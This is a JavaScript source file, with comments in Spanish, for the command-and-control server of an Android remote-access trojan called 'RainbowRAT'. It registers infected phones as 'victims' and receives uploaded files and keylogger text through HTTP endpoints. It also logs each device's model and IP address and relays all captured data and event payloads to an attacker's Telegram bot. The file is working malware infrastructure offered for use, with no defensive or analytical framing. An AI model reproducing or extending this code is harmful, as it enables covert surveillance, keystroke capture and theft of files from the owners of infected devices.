const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * SERVIDOR C2 RAINBOW - VERSIÓN DE DEPURACIÓN (DEBUG)
 * Diseñado para capturar conexiones ofuscadas y parámetros de consulta.
 */

let config = { token: "", id: "" };
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("❌ Error: data.json no encontrado.");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);

// Configuración de Socket.io optimizada para clientes Android antiguos/ofuscados
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true, // Crucial para la versión de Socket.io en el APK
    transports: ['websocket', 'polling'] // Permitir ambos métodos de transporte
});

const bot = new TelegramBot(config.token, { polling: true });
const victims = new Map();

app.use(express.json());

// Log de cada petición HTTP para ver si el APK intenta conectar vía POST/GET
app.use((req, res, next) => {
    console.log(`[HTTP] ${req.method} ${req.url} - IP: ${req.ip}`);
    next();
});

// Endpoints HTTP (Upload y Text)
const upload = multer({ storage: multer.memoryStorage() });
app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>📁 Archivo de:</b> <code>${devId}</code>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.send('ok');
});

app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    const text = req.body.text || JSON.stringify(req.body);
    bot.sendMessage(config.id, `<b>⌨️ Keylog [${devId}]:</b>\n<code>${text}</code>`, { parse_mode: 'HTML' });
    res.send('ok');
});

// --- GESTIÓN DE SOCKETS CON DEPURACIÓN ---

io.on('connection', (socket) => {
    // IMPORTANTE: El APK puede enviar los datos en la URL (query) o en Headers
    const query = socket.handshake.query;
    const headers = socket.handshake.headers;
    
    console.log("[SOCKET] Intento de conexión detectado");
    console.log("-> Query Params:", JSON.stringify(query));
    console.log("-> Headers:", JSON.stringify(headers));

    // Intentamos obtener el ID del dispositivo de múltiples fuentes
    const deviceId = query.currenttarget || headers['currenttarget'] || query.model || headers['model'] || socket.id;
    const model = query.model || headers['model'] || "Android Device";

    victims.set(deviceId, socket.id);
    
    console.log(`[+] Víctima Identificada: ${model} (${deviceId})`);

    bot.sendMessage(config.id, `<b>✅ Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>\nIP: ${socket.handshake.address}`, { parse_mode: 'HTML' });

    socket.on('ping', () => socket.emit('pong'));

    socket.on('data', (data) => {
        console.log(`[DATA] de ${deviceId}:`, data);
        const report = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>📨 Respuesta:</b>\n<pre>${report}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', (reason) => {
        console.log(`[-] Desconectado: ${deviceId} (Razón: ${reason})`);
        victims.delete(deviceId);
        bot.sendMessage(config.id, `<b>❌ Dispositivo Offline</b>\nID: ${deviceId}`);
    });

    // Capturar cualquier evento no definido para ver si el APK usa otros nombres
    socket.onAny((eventName, ...args) => {
        if (eventName !== 'ping' && eventName !== 'data') {
            console.log(`[EVENTO DESCONOCIDO] ${eventName}:`, args);
            bot.sendMessage(config.id, `<b>🔔 Evento detectado:</b> <code>${eventName}</code>\nPayload: <pre>${JSON.stringify(args)}</pre>`, { parse_mode: 'HTML' });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 C2 escuchando en puerto ${PORT}`);
    console.log(`Servidor listo para recibir conexiones de RainbowRAT`);
});
